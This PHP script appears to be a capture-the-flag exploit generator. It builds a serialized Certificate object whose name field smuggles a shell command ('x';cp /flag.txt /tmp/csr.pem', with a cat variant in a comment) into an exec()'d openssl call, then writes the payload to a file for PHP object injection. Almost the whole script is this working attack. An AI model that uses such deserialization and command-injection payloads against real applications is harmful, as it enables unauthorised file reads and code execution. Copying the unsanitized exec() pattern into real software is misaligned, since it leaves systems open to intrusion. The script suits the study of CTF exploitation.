<?php
// ini_set('display_errors', 1);
// ini_set('display_startup_errors', 1);
// error_reporting(E_ALL);
// error_reporting(0);

class User{
  public $name;
  public $id;

  function __construct($id, $name){
    $this->id = $id;
    $this->name = $name;  
  }

}

class Certificate{
  public $name;
  public $expire_date;
  private $csr;
  private $key;

  function __construct($name, $expire_date){
    $this->name = $name;
    $this->expire_date = $expire_date;
  }

  function isExpired(){
    return $this->expire_date < time();
  }

  function getExpireDate(){
    return date("Y-m-d H:i:s", $this->expire_date);
  }

  function getCSR(){
    if($this->csr == null)
      $this->generate();
    return $this->csr;
  }

  function getKey(){
    if($this->key == null)
      $this->generate();
    return $this->key;
  }

  function generate(){
    $output=null;
    $retval=null;
    if(!file_exists("key.pem")){
      $this->generate_key();
    }
    $cmd = "openssl req -new -key /tmp/key.pem -days 10 -out /tmp/csr.pem -subj '/CN=".$this->name."'";
    echo($cmd);
    exec($cmd, $output, $retval);
    $this->expire_date = time() + 10*24*60*60;
    $f = fopen("/tmp/csr.pem", "r");
    $this->csr = fread($f, filesize("/tmp/csr.pem"));
    fclose($f);
  }

  function generate_key(){
    $output=null;
    $retval=null;
    exec("openssl genrsa -out /tmp/key.pem 1024", $output, $retval);
    $f = fopen("/tmp/key.pem", "r");
    $this->key = fread($f, filesize("/tmp/key.pem"));
    fclose($f);
  }


  function __toString() {
    return $this->name." ".$this->getCSR()." ".$this->getKey();
  }
}

// Create an array with an array of mappings "name" -> object
$evil_certificate = new Certificate("evil", time() + 10*24*60*60);
$evil_certificate->name = "x';cp /flag.txt /tmp/csr.pem";
// or $evil_certificate->name = "x';cat /flag.txt > /tmp/csr.pem";

$arr = array(
    array("name" => $evil_certificate)
);

// Serialize the array
$serialized = serialize($arr);

// Write the serialized array to a file
file_put_contents("serialization", $serialized);
?>